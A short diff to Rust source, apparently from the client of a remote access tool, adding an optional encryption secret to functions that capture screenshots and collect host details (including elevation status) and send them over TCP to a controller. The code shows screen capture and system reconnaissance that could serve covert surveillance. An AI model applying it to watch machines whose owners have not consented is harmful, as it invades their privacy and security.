@@ -19,7 +19,7 @@ use crate::service::install::is_elevated;
 use common::buffers::write_buffer;
 use common::commands::{ ClientInfo, Command };
 
-pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
+pub fn take_screenshot(write_stream: &mut TcpStream, display: i32, secret: &Option<Vec<u8>>) {
     let screens = Screen::all().unwrap();
 
     let screen = screens[display as usize];
@@ -32,10 +32,10 @@ pub fn take_screenshot(write_stream: &mut TcpStream, display: i32) {
         .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
         .expect("Couldn't write image to bytes.");
 
-    write_buffer(write_stream, Command::ScreenshotResult(bytes));
+    write_buffer(write_stream, Command::ScreenshotResult(bytes), secret);
 }
 
-pub fn client_info(write_stream: &mut TcpStream) {
+pub fn client_info(write_stream: &mut TcpStream, secret: &Option<Vec<u8>>) {
     let mut s = System::new_all();
 
     let mut storage = Vec::new();
@@ -107,7 +107,7 @@ pub fn client_info(write_stream: &mut TcpStream) {
         is_elevated: is_elevated(),
     };
 
-    write_buffer(write_stream, Command::Client(client_data));
+    write_buffer(write_stream, Command::Client(client_data), secret);
 }
 
 const SUFFIX: [&str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];
